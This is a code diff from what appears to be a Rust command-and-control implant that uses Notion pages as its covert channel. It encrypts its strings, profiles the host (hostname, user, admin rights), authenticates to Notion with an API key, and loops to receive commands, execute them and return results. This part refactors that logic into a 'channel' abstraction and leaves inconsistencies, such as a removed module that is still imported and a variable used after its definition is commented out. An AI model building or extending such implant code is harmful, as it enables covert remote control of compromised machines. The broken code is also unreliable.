@@ -19,13 +19,14 @@ use base64::decode;
 use litcrypt::{lc, use_litcrypt};
 
 mod config;
+pub mod channels;
+use channels::{ChannelType};
 use config::{
     ConfigOptions,
     get_config_options, 
     load_config_options
 };
 
-mod notion;
 use notion::{get_blocks, complete_command, create_page, send_result};
 
 mod cmd;
@@ -38,9 +39,10 @@ use_litcrypt!();
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    
+
+    // Log start
     println!("{}", lc!("[*] Starting!"));
-    
+
     // Handle config options
     let mut config_options: ConfigOptions;
 
@@ -68,10 +70,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
+    // TODO: Initialize Channel
+
     let logger = logger::Logger::new(config_options.log_level);
 
+
     // Start Notion App if configured to do so
-    if config_options.launch_app {
+    // TODO: Replace with launch_app abstraction
+    if !config_options.launch_app.is_empty() {
         logger.info(log_out!("Launching app"));
         let browser_cmd: String;
         #[cfg(windows)] {
@@ -102,30 +108,31 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         exit(1)
     }
 
-    let mut hn = hostname();
-    let username = whoami::username();
-    hn.push_str(" | ");
-    hn.push_str(&username);
-    let is_admin = cmd::getprivs::is_elevated();  
-    logger.info(format!("Admin context: {}", is_admin));
-    if is_admin {
-        hn.push_str("*");
-    }
+    // MOVED TO CHANNEL
+    // ================
+    // let mut hn = hostname();
+    // let username = whoami::username();
+    // hn.push_str(" | ");
+    // hn.push_str(&username);
+    // let is_admin = cmd::getprivs::is_elevated();  
+    // logger.info(format!("Admin context: {}", is_admin));
+    // if is_admin {
+    //     hn.push_str("*");
+    // }
+
+    // CHANNEL PROCEDURE
+    // =================
+    // 1. Load config
+    // 2. Instantiate channel
+    // 3. Begin loop
+    //  a. Receive Commands
+    //  b. Execute Commands
+    //  c. Send results
+    // 4. Watch for shutdown commands
+
 
     logger.info(log_out!("Hostname: ", &hn));
     logger.debug(format!("Config options: {:?}", config_options));
-
-    let mut headers = HeaderMap::new();
-    headers.insert("Notion-Version", "2021-08-16".parse()?);
-    headers.insert(CONTENT_TYPE, "application/json".parse()?);
-    headers.insert(AUTHORIZATION, format!("Bearer {}", config_options.api_key).parse()?);
-    let client = Client::builder()
-        .default_headers(headers)
-        .build()?;
-
-    let page_id = create_page(&client, &config_options, hn, &logger, is_admin)
-        .await
-        .unwrap();
     
     loop {
         // Get Blocks
